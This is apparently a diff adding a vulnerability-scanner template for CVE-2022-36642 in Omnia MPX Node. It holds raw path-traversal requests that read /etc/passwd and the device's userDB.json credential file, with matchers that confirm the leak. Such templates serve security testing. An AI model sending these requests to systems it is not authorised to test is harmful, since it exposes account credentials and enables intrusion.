@@ -1,0 +1,33 @@
+id: omnia-mpx-node-logs-arbitrary-file-read
+info:
+  name: Omnia MPX Node Overview Logs Arbitrary File Read (CVE-2022-36642)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2022-36642,arbitrary-file-read
+
+http:
+  - raw:
+      - |
+        GET /logs/downloadMainLog?fname=../../../../../../..//etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /logs/downloadMainLog?fname=../../../../../../..///config/MPXnode/www/appConfig/userDB.json HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+
+      - type: word
+        words:
+          - "\"username\":"
+          - "\"password\":"
+          - "\"roleUser\":"
+        condition: and
+
+    stop-at-first-match: true
